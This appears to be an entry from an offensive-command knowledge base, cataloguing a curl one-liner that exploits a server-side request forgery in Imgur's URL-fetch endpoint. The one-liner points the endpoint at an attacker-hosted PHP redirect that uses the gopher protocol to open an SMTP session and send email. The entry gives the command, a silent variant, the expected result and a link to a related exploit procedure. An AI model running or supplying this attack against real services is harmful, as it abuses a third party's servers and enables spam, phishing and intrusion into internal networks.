---
data: >-
  curl
  "https://imgur.com/vidgif/url?url=http://yourserver.com/gopher2.php?rand=$(date
  +%s)"
tags:
  - ssrf
  - gopher
type: command
output: HTTP response; triggers SMTP session via redirect
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:08.986Z'
id: 489acda2-a5ee-4e5c-a27a-47ea623e4570
verified: false
validated: true
submitted: true
---
# curl-gopher-trigger

## Command

```bash
curl "https://imgur.com/vidgif/url?url=http://yourserver.com/gopher2.php?rand=$(date +%s)"
```

## Description

Trigger GOPHER-based SMTP exploit via PHP redirect in Imgur SSRF.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `url=` | HTTP URL to PHP redirect with rand for uniqueness | Yes |

## Examples

### Basic Usage

As above.

### Advanced Usage

```bash
curl -s "https://imgur.com/vidgif/url?url=http://yourserver.com/gopher.php"
```

> Silent (-s) mode.

## Expected Output

Email sent; check recipient inbox.

## Related

- [[procedures/Craft-SMTP-Exploit-via-Gopher-Protocol-with-PHP-Redirect]]
